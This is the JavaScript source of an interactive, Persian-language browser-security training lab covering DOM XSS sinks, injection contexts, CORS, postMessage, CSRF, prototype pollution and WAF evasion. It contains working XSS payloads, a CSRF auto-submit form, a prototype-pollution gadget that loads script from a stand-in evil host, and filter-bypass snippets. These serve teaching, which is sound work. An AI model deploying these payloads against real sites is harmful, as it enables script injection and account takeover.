const KEY = "js-lab-v5";
const $ = (s, r=document) => r.querySelector(s);
const toast = (m) => { const t=$("#toast"); t.textContent=m; t.classList.add("show"); setTimeout(()=>t.classList.remove("show"), 2400); };

const mods = [
  { id:"m1", title:"DOM / BOM و Source–Sink", topic:"مبانی",
    blurb:"window ⊃ document ⊃ Node. دادهٔ کنترل‌پذیر از Source تا Sink اجرایی." },
  { id:"m2", title:"Injection Contexts", topic:"XSS",
    blurb:"بدنهٔ HTML، attribute نقل‌قول‌شده، URL sink و رشتهٔ JS — هر کدام payload جدا." },
  { id:"m3", title:"Sinkهای HTML: innerHTML و insertAdjacentHTML", topic:"DOM XSS",
    blurb:"اسکریپت parser-inserted در برابر gadget رویداد (onerror / onload)." },
  { id:"m4", title:"XHR / Fetch · responseType و credentials", topic:"AJAX",
    blurb:"readyState، responseType=document، credentials:include." },
  { id:"m5", title:"Same-Origin Policy", topic:"SOP",
    blurb:"سه‌تایی scheme + host + port. SOP جلوی خواندن را می‌گیرد نه ارسال." },
  { id:"m6", title:"پیکربندی غلط CORS", topic:"CORS",
    blurb:"انعکاس ACAO به‌همراه ACAC، ستاره در برابر credentials، Origin تهی، preflight." },
  { id:"m7", title:"window.postMessage", topic:"پنجره‌های متقابل",
    blurb:"targetOrigin ستاره و listener بدون بررسی event.origin." },
  { id:"m8", title:"CSRF · کوکی · SameSite", topic:"CSRF",
    blurb:"درخواست ساده، GET در Lax، دزدیدن توکن با XSS همان origin." },
  { id:"m9", title:"گونه‌های XSS", topic:"XSS",
    blurb:"Reflected / Stored / DOM / Blind / Self. View-Source در برابر DOM زمان اجرا." },
  { id:"m10", title:"Prototype Pollution و دور زدن WAF", topic:"پیشرفته",
    blurb:"گجت __proto__، fromCharCode، bracket notation، ترتیب NFKD و فیلتر." },
];

function load(){ try { return JSON.parse(localStorage.getItem(KEY)||"{}"); } catch { return {}; } }
function save(s){ localStorage.setItem(KEY, JSON.stringify(s)); }
function done(id){ const s=load(); s[id]=true; save(s); renderHome(); }

function renderHome(){
  const s=load();
  const n=mods.filter(m=>s[m.id]).length;
  $("#prog-text").textContent = n+" / "+mods.length;
  $("#prog-bar").style.width = (n/mods.length*100)+"%";
  $("#mod-list").innerHTML = mods.map(m => `
    <button class="card ${s[m.id]?"done":""}" data-id="${m.id}">
      <b>${m.title}</b>
      <span>${m.blurb}</span>
      <i class="tag">${m.topic}${s[m.id]?" · تمام":""}</i>
    </button>`).join("");
  $("#mod-list").onclick = (e) => {
    const b=e.target.closest("[data-id]"); if(b) openMod(b.dataset.id);
  };
}
function openHome(){
  $("#lesson").classList.remove("active");
  $("#home").classList.add("active");
  renderHome();
}
function wrap(title, html){
  $("#home").classList.remove("active");
  const el=$("#lesson");
  el.classList.add("active");
  el.innerHTML = `<div class="lesson"><div class="crumbs"><button type="button" id="back">← ماژول‌ها</button></div><h2>${title}</h2>${html}</div>`;
  $("#back").onclick = openHome;
}
function markBtn(){
  return `<div class="row"><button class="primary" id="mark" type="button">این ماژول را تمام‌شده علامت بزن</button></div>`;
}
function afterMark(id){
  const b=$("#mark"); if(b) b.onclick=()=>{ done(id); toast("ثبت شد"); openHome(); };
}
function openMod(id){
  const m=mods.find(x=>x.id===id);
  wrap(m.title, builders[id]());
  if(hooks[id]) hooks[id]();
  afterMark(id);
}

const builders = {
  m1(){ return `<div class="block"><h3>مدل شیء مرورگر</h3>
<p><b>BOM</b> لایهٔ مرورگر است: <code>window</code>، <code>location</code>، <code>history</code>، <code>navigator</code>.</p>
<p><b>DOM</b> درخت Node ساخته‌شده از HTML است. زنجیرهٔ prototype:</p>
<p><code>HTMLElement → Element → Node → EventTarget → Object</code></p>
<pre>window === this
document === window.document
location === window.location === document.location</pre></div>
<div class="block"><h3>جریان taint از Source به Sink</h3>
<p>باگ سمت کلاینت وقتی است که Source تحت کنترل مهاجم بدون پاکسازی به Sink اجرایی برسد.</p>
<pre>// Sources
location.href / hash / search / pathname
document.URL / documentURI / referrer / cookie
history.state / window.name / event.data
xhr.responseText / fetch().text() / URLSearchParams

// Sinks
innerHTML / outerHTML / insertAdjacentHTML / document.write
eval / Function / setTimeout(string)
location.href / assign / replace
element.src / href / setAttribute("onerror")
postMessage(data, "*")</pre></div>
<div class="lab"><label>Source شبیه‌سازی‌شده (معادل location.hash.slice(1))</label>
<input id="src" type="text" value="<img src=x onerror=console.log('sink-fired')>" />
<div class="row">
<button id="to-text" type="button">بریز در textContent</button>
<button id="to-html" type="button">بریز در innerHTML</button>
<button id="to-adj" type="button">insertAdjacentHTML</button>
<button id="to-loc" type="button">location.hash = مقدار</button>
</div>
<div class="out" id="sink-out">sink خالی است</div>
<pre id="m1-note"></pre></div>${markBtn()}`; },

  m2(){ return `<div class="block"><h3>context مشخص می‌کند payload را</h3>
<p>یک رشته برای همهٔ XSS کار نمی‌کند. باید ببینی ورودی کجا reflect می‌شود.</p>
<pre>&lt;div&gt;USER&lt;/div&gt;
payload: &lt;img src=x onerror=alert(1)&gt;

&lt;input value="USER"&gt;
payload: " autofocus onfocus=alert(1) x="

&lt;a href="USER"&gt;
payload: javascript:alert(document.domain)

&lt;script&gt;var q = "USER";&lt;/script&gt;
payload: ";alert(1);//</pre></div>
<div class="lab"><label>context و payload</label>
<select id="ctx">
<option value="href">URL sink — a.href</option>
<option value="attr">attribute نقل‌قول‌شده — input.value</option>
<option value="html">بدنهٔ HTML — innerHTML</option>
<option value="js">رشته داخل JS</option>
</select>
<input id="pay" type="text" value="javascript:alert(1)" style="margin-top:8px" />
<div class="row"><button id="render-ctx" class="primary" type="button">در sink رندر کن</button></div>
<div class="out" id="ctx-out"></div>
<pre id="ctx-code"></pre></div>${markBtn()}`; },

  m3(){ return `<div class="block"><h3>رفتار HTML parser هنگام assignment</h3>
<p><code>innerHTML</code> رشته را parse می‌کند. <code>&lt;script&gt;</code> که از این راه وارد DOM شود معمولاً اجرا نمی‌شود. gadgetهایی که اجرا می‌شوند: <code>img onerror</code>، <code>svg onload</code>، <code>iframe src=javascript:</code>، <code>details ontoggle</code>.</p>
<p>متن امن: <code>textContent</code>. HTML کنترل‌شده: DOMPurify یا Trusted Types.</p>
<pre>el.innerHTML = location.hash.slice(1);
el.insertAdjacentHTML("beforeend", source);
el.outerHTML = source;</pre></div>
<div class="lab"><label>payload</label>
<input id="p3" type="text" value='<img src=x onerror="this.outerHTML=&apos;[onerror اجرا شد]&apos;">' />
<div class="row">
<button id="html3" class="primary" type="button">innerHTML</button>
<button id="text3" type="button">textContent</button>
<button id="adj3" type="button">insertAdjacentHTML</button>
</div>
<div class="out" id="o3"></div></div>${markBtn()}`; },

  m4(){ return `<div class="block"><h3>ماشین حالت XMLHttpRequest</h3>
<pre>UNSENT 0 → OPENED 1 → HEADERS_RECEIVED 2 → LOADING 3 → DONE 4

const xhr = new XMLHttpRequest();
xhr.responseType = "document";
xhr.withCredentials = true;
xhr.onload = () => xhr.response.querySelector("[name=csrf]").value;
xhr.open("GET", "/my-account");
xhr.send();

await fetch("/my-account", { credentials: "include" });</pre>
<p>خواندن cross-origin بدون CORS موفق، TypeError می‌دهد. خود request ممکن است روی شبکه رفته باشد.</p></div>
<div class="lab"><p>fetch همان origin روی <code>child.html</code> و parse با <code>DOMParser</code>.</p>
<div class="row">
<button id="fetch4" class="primary" type="button">fetch + DOMParser</button>
<button id="xhr4" type="button">XHR</button>
</div>
<pre id="o4">// خروجی</pre></div>${markBtn()}`; },

  m5(){ return `<div class="block"><h3>سه‌تایی Origin</h3>
<p>Origin برابر است با <code>scheme://host:port</code>. مسیر و query جزء Origin نیستند.</p>
<pre>https://a.com در برابر http://a.com          scheme فرق دارد
https://a.com در برابر https://a.com:8443    port فرق دارد
https://a.com در برابر https://api.a.com     host فرق دارد
https://a.com/x در برابر https://a.com/y     همان origin</pre>
<p>SOP جلوی <b>خواندن</b> پاسخ cross-origin را می‌گیرد. ارسال معمولاً آزاد است؛ برای همین CSRF وجود دارد. XSS داخل origin قربانی اجرا می‌شود پس SOP اعمال نمی‌شود.</p>
<p><b>XSSI:</b> تگ <code>&lt;script src&gt;</code> از SOP معاف است. اگر پاسخ JS باشد و راز را در global بگذارد، صفحهٔ مهاجم آن را می‌خواند.</p></div>
<div class="lab"><pre id="orig"></pre>
<div class="quiz">
<label><input type="radio" name="q5" value="0"> SOP مانع ارسال فرم CSRF به origin دیگر می‌شود</label>
<label><input type="radio" name="q5" value="1"> SOP مانع خواندن JSON origin دیگر توسط جاوااسکریپت می‌شود</label>
<label><input type="radio" name="q5" value="2"> مسیر متفاوت همیشه یعنی cross-origin</label>
</div>
<button id="chk5" type="button">بررسی</button>
<div class="out" id="o5"></div></div>${markBtn()}`; },

  m6(){ return `<div class="block"><h3>هدرهای CORS</h3>
<pre>Origin: https://evil.example
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true</pre>
<ul>
<li>اگر ACAC برابر true باشد، ACAO نمی‌تواند ستاره باشد؛ مرورگر بدنه را به JS نمی‌دهد.</li>
<li>انعکاس Origin به‌همراه credentials یعنی خواندن credentialed از origin مهاجم.</li>
<li>regex یا contains ضعیف: <code>target.com.attacker.tld</code></li>
<li><code>Origin: null</code> از iframe سندباکس، <code>data:</code> یا زنجیرهٔ redirect می‌آید.</li>
<li>Preflight با OPTIONS وقتی متد غیرساده یا <code>Content-Type: application/json</code> باشد.</li>
</ul></div>
<div class="lab"><label>Origin مهاجم / مقدار منعکس‌شدهٔ ACAO</label>
<input id="ori6" type="text" value="https://evil.lab" />
<select id="acac6"><option value="true">ACAC برابر true</option><option value="false">ACAC برابر false</option></select>
<div class="row"><button id="sim6" class="primary" type="button">شبیه‌سازی تصمیم مرورگر</button></div>
<pre id="o6"></pre></div>${markBtn()}`; },

  m7(){ return `<div class="block"><h3>API مربوط به postMessage</h3>
<pre>otherWindow.postMessage(message, targetOrigin);
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example") return;
  if (event.source !== expectedWindow) return;
});</pre>
<ul>
<li>فرستنده با <code>targetOrigin = "*"</code> و دادهٔ حساس: هر embedder یا opener پیام را می‌گیرد.</li>
<li>گیرنده بدون allowlist روی <code>event.origin</code> و sink مثل innerHTML یا eval: XSS از origin مهاجم.</li>
<li>چک substring روی origin با <code>trusted.com.attacker.tld</code> می‌شکند.</li>
</ul></div>
<div class="lab"><p>listener فرزند: <code>box.innerHTML = event.data</code> بدون بررسی origin.</p>
<iframe class="child" id="child7" src="child.html"></iframe>
<input id="msg7" type="text" value='<img src=x onerror=parent.postMessage("child-sink-hit","*")>' />
<div class="row"><button id="send7" class="primary" type="button">parent → child.postMessage با targetOrigin ستاره</button></div></div>${markBtn()}`; },

  m8(){ return `<div class="block"><h3>شرایط exploit در CSRF</h3>
<ul>
<li>عمل تغییر وضعیت بعد از ورود</li>
<li>نشست داخل Cookie (نه فقط هدر اجباری Authorization: Bearer)</li>
<li>نبودن یا قابل‌حدس بودن CSRF token</li>
<li>درخواست simple بماند تا preflight نیاید</li>
</ul>
<pre>&lt;form action="https://target.example/change-email" method="POST"&gt;
  &lt;input name="email" value="attacker@evil"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
<p>SameSite=Lax هنوز کوکی را روی GET سطح بالا می‌فرستد. SameSite=Strict hop اول را می‌بندد؛ open-redirect روی origin قربانی hop دوم را same-site می‌کند. زنجیرهٔ XSS به CSRF: XHR همان origin، خواندن توکن از DOM، تکرار POST.</p></div>
<div class="lab"><div class="quiz">
<label><input type="radio" name="q8" value="0"> اگر API فقط Bearer بپذیرد، فرم HTML کلاسیک معمولاً کافی است</label>
<label><input type="radio" name="q8" value="1"> نشست فقط در Cookie و SameSite=None یعنی فرم cross-site کوکی را همراه می‌فرستد</label>
<label><input type="radio" name="q8" value="2"> CSRF یعنی خواندن JSON سایت قربانی</label>
</div>
<button id="chk8" type="button">بررسی</button>
<div class="out" id="o8"></div></div>${markBtn()}`; },

  m9(){ return `<div class="block"><h3>طبقه‌بندی</h3>
<pre>Reflected  payload داخل request است و در همان پاسخ برمی‌گردد. در View-Source دیده می‌شود.
Stored     ذخیره می‌شود و برای قربانی دیگر رندر می‌شود.
DOM-based  Source کلاینت (hash، history، postMessage) به Sink کلاینت می‌رسد.
           View-Source HTML اولیه را نشان می‌دهد، نه DOM بعد از اجرای JS.
Blind      خروجی را نمی‌بینی؛ اول با img به collab تزریق HTML را ثابت کن.
Self-XSS   فقط در نشست خودت؛ برای اثر باید با login CSRF زنجیر شود.</pre></div>
<div class="lab"><div class="quiz">
<label><input type="radio" name="q9" value="0"> GET /search?q= — سرور مقدار q را داخل HTML چاپ می‌کند</label>
<label><input type="radio" name="q9" value="1"> location.hash به innerHTML می‌رود؛ بک‌اند اصلاً آن را نمی‌بیند</label>
<label><input type="radio" name="q9" value="2"> نظر در پایگاه ذخیره و در پروفایل دیگران رندر می‌شود</label>
</div>
<button id="chk9" type="button">بررسی</button>
<div class="out" id="o9"></div></div>${markBtn()}`; },

  m10(){ return `<div class="block"><h3>Prototype Pollution</h3>
<pre>function merge(t,s){ for (let k in s) t[k]=s[k]; }
merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
({}).admin === true

b.__proto__.transport_url = "https://evil/x.js";
script.src = config.transport_url;</pre>
<p>ورودی از query: <code>?__proto__[admin]=true</code> یا <code>constructor[prototype][admin]=true</code> اگر merge بدون محافظ prototype باشد.</p></div>
<div class="block"><h3>دور زدن WAF</h3>
<pre>String.fromCharCode(97,108,101,114,116)
window["alert"](1)
window[atob("YWxlcnQ=")](1)
Function\`alert(1)\`
throw onerror=alert,1
normalize(NFKD) بعد از waf()   // ترتیب غلط</pre>
<p>decode و normalize و lowercase را <b>قبل</b> از فیلتر انجام بده.</p></div>
<div class="lab"><div class="row">
<button id="build10" class="primary" type="button">fromCharCode(97,108,101,114,116)</button>
<button id="pp10" type="button">آلوده کردن Object.prototype.labFlag</button>
<button id="ppclr" type="button">حذف labFlag</button>
</div>
<pre id="o10"></pre></div>${markBtn()}`; },
};

const hooks = {
  m1(){
    const out=$("#sink-out"), note=$("#m1-note"), val=()=>$("#src").value;
    $("#to-text").onclick=()=>{ out.textContent=val(); note.textContent="// textContent → پارس HTML انجام نمی‌شود"; };
    $("#to-html").onclick=()=>{ out.innerHTML=val(); note.textContent="// innerHTML → parser به‌همراه event handler"; };
    $("#to-adj").onclick=()=>{ out.textContent=""; out.insertAdjacentHTML("beforeend", val()); note.textContent="// insertAdjacentHTML همان parser را دارد"; };
    $("#to-loc").onclick=()=>{ location.hash=val(); note.textContent="// location.hash = "+location.hash+"\n// این فقط Source است؛ باید Sink مصرفش کند"; };
  },
  m2(){
    $("#render-ctx").onclick=()=>{
      const ctx=$("#ctx").value, p=$("#pay").value, o=$("#ctx-out");
      o.innerHTML="";
      if(ctx==="href"){ const a=document.createElement("a"); a.href=p; a.textContent="URL sink — فقط اگر لازم است کلیک کن"; o.append(a); $("#ctx-code").textContent=`<a href="${p}">`+"\nprotocol "+a.protocol; }
      else if(ctx==="attr"){ o.innerHTML=`<input value="${p}">`; $("#ctx-code").textContent=`<input value="${p}">`; }
      else if(ctx==="html"){ o.innerHTML=p; $("#ctx-code").textContent="container.innerHTML = payload"; }
      else { $("#ctx-code").textContent=`var q = "${p}";`; o.textContent="context رشتهٔ جاوااسکریپت"; }
    };
  },
  m3(){
    $("#html3").onclick=()=>{$("#o3").innerHTML=$("#p3").value;};
    $("#text3").onclick=()=>{$("#o3").textContent=$("#p3").value;};
    $("#adj3").onclick=()=>{ const o=$("#o3"); o.textContent=""; o.insertAdjacentHTML("beforeend", $("#p3").value); };
  },
  m4(){
    $("#fetch4").onclick=async()=>{
      try{
        const r=await fetch("child.html", { credentials:"same-origin" });
        const t=await r.text();
        const doc=new DOMParser().parseFromString(t,"text/html");
        $("#o4").textContent="status "+r.status+"\ncontent-type "+r.headers.get("content-type")+"\ntitle "+doc.title+"\n"+t.slice(0,220);
      }catch(e){ $("#o4").textContent=String(e); }
    };
    $("#xhr4").onclick=()=>{ const xhr=new XMLHttpRequest(); xhr.onload=()=>{$("#o4").textContent="readyState="+xhr.readyState+" status="+xhr.status+"\n"+xhr.responseText.slice(0,220);}; xhr.open("GET","child.html"); xhr.send(); };
  },
  m5(){
    $("#orig").textContent="location.origin = "+location.origin+"\n"+location.href+"\n"+location.protocol+" "+location.hostname+" "+location.port;
    $("#chk5").onclick=()=>{ const v=document.querySelector("[name=q5]:checked"); $("#o5").innerHTML = v&&v.value==="1" ? '<span class="ok">درست — SOP محدودیت روی خواندن پاسخ است.</span>' : '<span class="bad">غلط — فرم ارسال می‌شود؛ مسیر جزء origin نیست.</span>'; };
  },
  m6(){
    $("#sim6").onclick=()=>{
      const o=$("#ori6").value.trim(); const acac=$("#acac6").value==="true";
      const block = o==="*" && acac; const exp = o!=="*" && acac && o.length>0;
      $("#o6").textContent="HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: "+o+"\nAccess-Control-Allow-Credentials: "+acac+"\n\n{\"email\":\"victim@target\"}\n\nبدنه به JS داده می‌شود؟ "+(block?"خیر (* به‌همراه credentials)":"بله")+"\nخواندن credentialed از origin مهاجم؟ "+(exp?"بله — باگ کلاسیک انعکاس ACAO + ACAC":"خیر");
    };
  },
  m7(){ $("#send7").onclick=()=>{$("#child7").contentWindow.postMessage($("#msg7").value, "*");}; },
  m8(){ $("#chk8").onclick=()=>{ const v=document.querySelector("[name=q8]:checked"); $("#o8").innerHTML = v&&v.value==="1" ? '<span class="ok">درست — CSRF یعنی نوشتن اجباری با کوکی مرورگر.</span>' : '<span class="bad">Bearer با فرم ساده نمی‌رود. CSRF خواندن پاسخ نیست.</span>'; }; },
  m9(){ $("#chk9").onclick=()=>{ const v=document.querySelector("[name=q9]:checked"); $("#o9").innerHTML = v&&v.value==="1" ? '<span class="ok">DOM-based است.</span>' : '<span class="bad">گزینهٔ صفر reflected است؛ گزینهٔ دو stored است.</span>'; }; },
  m10(){
    $("#build10").onclick=()=>{ const s=String.fromCharCode(97,108,101,114,116); $("#o10").textContent=JSON.stringify(s)+"\nwindow[s]===alert → "+(window[s]===alert)+"\natob YWxlcnQ= → "+atob("YWxlcnQ="); };
    $("#pp10").onclick=()=>{ Object.prototype.labFlag="polluted"; const o={}; $("#o10").textContent="({}).labFlag === "+JSON.stringify(o.labFlag)+"\nhasOwnProperty labFlag === "+({}).hasOwnProperty("labFlag"); };
    $("#ppclr").onclick=()=>{ try{ delete Object.prototype.labFlag; }catch(e){} $("#o10").textContent="حذف شد؛ ({ }).labFlag === "+({}).labFlag; };
  },
};

$("#reset").onclick=()=>{ localStorage.removeItem(KEY); renderHome(); toast("پیشرفت پاک شد"); };
renderHome();
